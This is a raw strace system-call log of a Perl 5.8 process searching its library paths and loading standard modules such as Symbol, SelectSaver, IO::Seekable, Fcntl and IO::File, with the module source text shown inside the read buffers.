5779  07:10:39.106547 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.106559 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.106573 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.106585 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
5779  07:10:39.106606 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
5779  07:10:39.106620 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7178) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.106632 _llseek(8, 0, [0], SEEK_CUR) = 0
5779  07:10:39.106649 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
5779  07:10:39.107086 read(8,  <unfinished ...>
5777  07:10:39.107106 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5777  07:10:39.107130 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5777  07:10:39.107144 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5777  07:10:39.107155 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5777  07:10:39.107167 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
5777  07:10:39.107181 waitpid(-1,  <unfinished ...>
5779  07:10:39.107194 <... read resumed> "", 4096) = 0
5779  07:10:39.115787 close(8)          = 0
5779  07:10:39.115787 stat64("/etc/perl/SelectSaver.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.115788 stat64("/etc/perl/SelectSaver.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.115788 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.115788 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.115788 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.115797 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.115811 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.115823 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.115837 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.115849 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.115862 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.115875 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.115889 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.115902 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
5779  07:10:39.115923 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
5779  07:10:39.115938 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7178) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.115949 _llseek(8, 0, [0], SEEK_CUR) = 0
5779  07:10:39.115968 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
5779  07:10:39.116148 brk(0x81d6000)    = 0x81d6000
5779  07:10:39.116180 read(8, "", 4096) = 0
5779  07:10:39.116192 close(8)          = 0
5779  07:10:39.116638 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
5779  07:10:39.117277 read(6, "", 4096) = 0
5779  07:10:39.117293 close(6)          = 0
5779  07:10:39.117332 stat64("/etc/perl/IO/Seekable.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117351 stat64("/etc/perl/IO/Seekable.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117366 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117379 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117393 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117405 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117419 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117431 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117444 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117456 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117469 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117482 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
5779  07:10:39.117503 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
5779  07:10:39.117518 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7628) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.117527 _llseek(6, 0, [0], SEEK_CUR) = 0
5779  07:10:39.117527 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
5779  07:10:39.117527 stat64("/etc/perl/Fcntl.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117528 stat64("/etc/perl/Fcntl.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117540 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117553 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117566 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117579 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117592 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117604 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117616 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117628 stat64("/usr/share/perl5/Fcntl.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117641 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.117653 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
5779  07:10:39.117673 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
5779  07:10:39.117687 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7178) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.117698 _llseek(8, 0, [0], SEEK_CUR) = 0
5779  07:10:39.117717 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
5779  07:10:39.118103 brk(0x81f7000)    = 0x81f7000
5779  07:10:39.118333 read(8, "", 4096) = 0
5779  07:10:39.118365 close(8)          = 0
5779  07:10:39.118435 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
5779  07:10:39.118470 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
5779  07:10:39.118503 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
5779  07:10:39.118518 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
5779  07:10:39.118607 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
5779  07:10:39.118625 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d0d000
5779  07:10:39.118639 mmap2(0xb7d10000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7d10000
5779  07:10:39.118654 close(8)          = 0
5779  07:10:39.118905 read(6, "", 4096) = 0
5779  07:10:39.118928 close(6)          = 0
5779  07:10:39.118961 stat64("/etc/perl/IO/File.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.118976 stat64("/etc/perl/IO/File.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.118990 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119002 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119016 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119029 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119042 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119054 stat64("/usr/lib/perl5/IO/File.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119067 stat64("/usr/share/perl5/IO/File.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119079 stat64("/usr/share/perl5/IO/File.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119092 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119104 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
5779  07:10:39.119125 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
5779  07:10:39.119139 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7628) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.119151 _llseek(6, 0, [0], SEEK_CUR) = 0
5779  07:10:39.119168 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
5779  07:10:39.119556 stat64("/etc/perl/File/Spec.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119573 stat64("/etc/perl/File/Spec.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119586 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119599 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119612 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
